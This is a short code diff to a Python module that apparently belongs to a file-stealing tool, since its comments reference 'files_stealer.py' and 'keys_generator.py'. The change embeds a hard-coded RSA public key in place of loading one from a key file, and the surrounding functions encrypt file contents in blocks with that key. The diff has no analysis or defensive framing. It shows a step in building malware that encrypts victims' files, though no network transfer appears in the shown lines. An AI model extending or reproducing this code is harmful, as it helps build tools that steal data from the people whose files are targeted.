@@ -10,6 +10,8 @@ from Crypto.PublicKey import RSA
 public_key_size = 2048 #integrate with keys_generator.py
 public_key_name = "pbl.key" #integrate with name in files_stealer.py
 chunk_size = public_key_size / 8
+pub_key = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr5Hfi/ono0rBq1OHOOxS\n8HpNkG7pDSWcm5lwV9ATXREfhu997Gy3uGDbviOLgKqKeWZ5+2KzsPR54I6cyhLS\nYqny8t1+/hCy0NUuAMVxbB0SAgXCjDFr/6hTjsmb/EKZ2ZDIkWQmRYF4xzCkvSDg\nIUrKYDEena5WVGm3mmfEMmpAEyUoxpVF6JgUcarqxsi0t9EPY0nATXjqPZHsueJD\n4bcAutdGWU0Q86zt5d/157EZEet8J1YJOTqxMRmhVBBr5J2W/MLjpqBxI0kCHi3S\nWEmwM3335bu102MBUvV0vQ2IU5CYSxGqWIkXhqVx6ZRw4z+TYOBKrYRW0QPlVrwA\n4wIDAQAB\n-----END PUBLIC KEY-----'
+
 
 def translate_special_path(path):
     home_folder = os.path.expanduser("~")
@@ -65,8 +67,7 @@ def encrypt_word_with_key(content, key):
 
 
 def get_public_key():
-    with open(public_key_name, "rt") as pub_key:
-        return RSA.importKey(pub_key.read())
+    return RSA.importKey(pub_key)
 
 
 def encrypt_file_content_with_public_key(file_content, block_size):
